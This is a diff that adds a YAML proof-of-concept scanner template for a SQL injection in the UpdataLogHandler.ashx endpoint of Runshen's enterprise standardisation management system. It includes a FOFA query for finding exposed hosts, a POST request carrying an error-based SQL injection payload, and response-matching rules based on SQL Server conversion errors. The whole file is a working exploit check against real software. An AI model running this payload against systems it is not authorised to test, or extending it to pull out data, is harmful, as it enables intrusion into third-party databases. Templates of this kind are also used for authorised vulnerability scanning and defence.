@@ -1,0 +1,20 @@
+id: poc-yaml-run-shen-updataloghandler-sqli
+info:
+  name: 润申企业标准化管理系统 UpdataLogHandler SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 企业标准化管理系统
+  fofa: body="企业标准化管理系统"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /PDCA/ashx/UpdataLogHandler.ashx
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: action=GetAll&start='and (select sys.fn_varbintohexstr(hashbytes(%27MD5%27,%27{{.t1}}%27)))>0--&end=&code=11&type=2&page=1&rows=20
+  expression: "status_code == 500 && \ncontains(body,t2) &&\ncontains(body,\"在将 nvarchar\
+    \ 值\") &&\ncontains(body,\"转换成数据类型 int 时失败\")\n"
+transport: http
